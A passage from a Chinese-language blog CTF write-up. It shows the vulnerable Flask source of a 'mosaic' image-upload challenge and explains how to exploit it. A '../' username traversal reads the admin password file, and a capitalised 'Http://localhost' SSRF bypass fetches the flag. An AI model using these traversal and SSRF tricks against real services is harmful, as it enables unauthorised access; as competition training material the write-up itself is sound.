class="hljs-comment">------WebKitFormBoundarydFZmSiashN04RJ1C--</span></span><br></code></pre></td></tr></table></figure>
<p>以上可以通过<a target="_blank" rel="noopener" href="http://58.225.56.195/download.php?idx=">http://58.225.56.195/download.php?idx=</a>… 访问，通过bot使用<a target="_blank" rel="noopener" href="http://58.225.56.195/report.php?path=download.php&amp;idx=">http://58.225.56.195/report.php?path=download.php&amp;idx=</a>… 获得flag</p>
<h2 id="mosaic"><a href="#mosaic" class="headerlink" title="mosaic"></a>mosaic</h2><p>文件上传+文件包含+SSRF</p>
<p>查看原代码，该网页允许上传文件</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sas">@app.route(<span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def upload():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;logged_in&#x27;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">redirect</span>(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file part&#x27;</span><br>        <span class="hljs-keyword">file</span> = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">file</span>.<span class="hljs-keyword">filename</span> == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No selected file&#x27;</span><br>        <span class="hljs-keyword">filename</span> = os.path.basename(<span class="hljs-keyword">file</span>.<span class="hljs-keyword">filename</span>)<br>        guesstype = mimetypes.guess_type(<span class="hljs-keyword">filename</span>)[0]<br>        image_path = os.path.joi<span class="hljs-meta">n</span>(f<span class="hljs-string">&#x27;&#123;UPLOAD_FOLDER&#125;/&#123;session[&quot;username&quot;]&#125;&#x27;</span>, <span class="hljs-keyword">filename</span>)<br>        <span class="hljs-keyword">if</span> type_check(guesstype):<br>            <span class="hljs-keyword">file</span>.save(image_path)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;upload.html&quot;</span>, image_path = image_path)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Allowed file types are png, jpeg, jpg, zip, tiff..&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;upload.html&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>可以通过<code>/mosaic</code>访问上传图像的马赛克版本：</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/mosaic&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-built_in">mosaic</span>():<br>    if <span class="hljs-keyword">not</span> session.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;logged_in&#x27;</span>):<br>        return <span class="hljs-built_in">redirect</span>(<span class="hljs-built_in">url_for</span>(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    if request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        image_url = request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;image_url&#x27;</span>)<br>        if image_url <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;../&quot;</span> <span class="hljs-keyword">not</span> in image_url <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> image_url.<span class="hljs-built_in">startswith</span>(<span class="hljs-string">&quot;/&quot;</span>):<br>            guesstype = mimetypes.<span class="hljs-built_in">guess_type</span>(image_url)[<span class="hljs-number">0</span>]<br>            ext = guesstype.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">1</span>]<br>            mosaic_path = os.path.<span class="hljs-built_in">join</span>(f<span class="hljs-string">&#x27;&#123;MOSAIC_FOLDER&#125;/&#123;session[&quot;username&quot;]&#125;&#x27;</span>, f<span class="hljs-string">&#x27;&#123;os.urandom(8).hex()&#125;.&#123;ext&#125;&#x27;</span>)<br>            filename = os.path.<span class="hljs-built_in">join</span>(f<span class="hljs-string">&#x27;&#123;UPLOAD_FOLDER&#125;/&#123;session[&quot;username&quot;]&#125;&#x27;</span>, image_url)<br>            if os.path.<span class="hljs-built_in">isfile</span>(filename):<br>                image = imageio.<span class="hljs-built_in">imread</span>(filename)<br>            elif image_url.<span class="hljs-built_in">startswith</span>(<span class="hljs-string">&quot;http://&quot;</span>) or image_url.<span class="hljs-built_in">startswith</span>(<span class="hljs-string">&quot;https://&quot;</span>):<br>                return <span class="hljs-string">&quot;Not yet..! sry..&quot;</span><br>            <span class="hljs-attribute">else</span>:<br>                if <span class="hljs-built_in">type_check</span>(guesstype):<br>                    image_data = requests.<span class="hljs-built_in">get</span>(image_url, headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:request.headers.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;Cookie&quot;</span>)&#125;).content<br>                    image = imageio.<span class="hljs-built_in">imread</span>(image_data)<br>            <br>            <span class="hljs-built_in">apply_mosaic</span>(image, mosaic_path)<br>            return <span class="hljs-built_in">render_template</span>(<span class="hljs-string">&quot;mosaic.html&quot;</span>, mosaic_path = mosaic_path)<br>        <span class="hljs-attribute">else</span>:<br>            return <span class="hljs-string">&quot;Plz input image_url or Invalid image_url..&quot;</span><br>    return <span class="hljs-built_in">render_template</span>(<span class="hljs-string">&quot;mosaic.html&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>可以发现flag文件如下：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">if</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.exists(<span class="hljs-string">&quot;/flag.png&quot;</span>):<br>    FLAG = <span class="hljs-string">&quot;/flag.png&quot;</span><br><span class="hljs-keyword">else</span>:<br>    FLAG = <span class="hljs-string">&quot;/test-flag.png&quot;</span><br></code></pre></td></tr></table></figure>
<p>在路径<code>/flag.png</code><br>由此，可以尝试上传文件<code>./file.zip/flag.png</code>或<code>./file.zip#flag.png</code><br>存在目录遍历：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/check_upload/@&lt;username&gt;/&lt;file&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_upload</span>(<span class="hljs-params">username, file</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;logged_in&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">and</span> session[<span class="hljs-string">&quot;username&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Access Denied..&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;UPLOAD_FOLDER&#125;</span>/<span class="hljs-subst">&#123;username&#125;</span>&#x27;</span>, file)<br></code></pre></td></tr></table></figure>
<p>可以使用用户名<code>../</code>绕过获得管理员密码文件<code>password.txt</code>，以此登录管理员账号<br>由以上代码，需从localhost访问，在<code>/mosaic</code>存在ssrf</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.isfile</span>(filename):<br>               image = imageio<span class="hljs-selector-class">.imread</span>(filename)<br>           elif image_url<span class="hljs-selector-class">.startswith</span>(<span class="hljs-string">&quot;http://&quot;</span>) or image_url<span class="hljs-selector-class">.startswith</span>(<span class="hljs-string">&quot;https://&quot;</span>):<br>               return <span class="hljs-string">&quot;Not yet..! sry..&quot;</span><br>           <span class="hljs-keyword">else</span>:<br>               <span class="hljs-keyword">if</span> <span class="hljs-built_in">type_check</span>(guesstype):<br>                   image_data = requests<span class="hljs-selector-class">.get</span>(image_url, headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:request<span class="hljs-selector-class">.headers</span><span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;Cookie&quot;</span>)&#125;)<span class="hljs-selector-class">.content</span><br>                   image = imageio<span class="hljs-selector-class">.imread</span>(image_data)<br></code></pre></td></tr></table></figure>
<p>对于<code>http://</code>可以使用<code>Http://</code>代替，可以使用<code>Http://localhost:9999/#test.png </code>绕过，访问<code>http://58.229.185.52:9999/check_upload/@admin/flag.png</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              

              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/09/09/morexss/" title="2023/09/09：more xss：canvas，png和xss">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2023/09/09：more xss：canvas，png和xss</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/09/06/DVWA/" title="2023/09/06:DVWA记录">
                        <span class="hidden-mobile">2023/09/06:DVWA记录</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
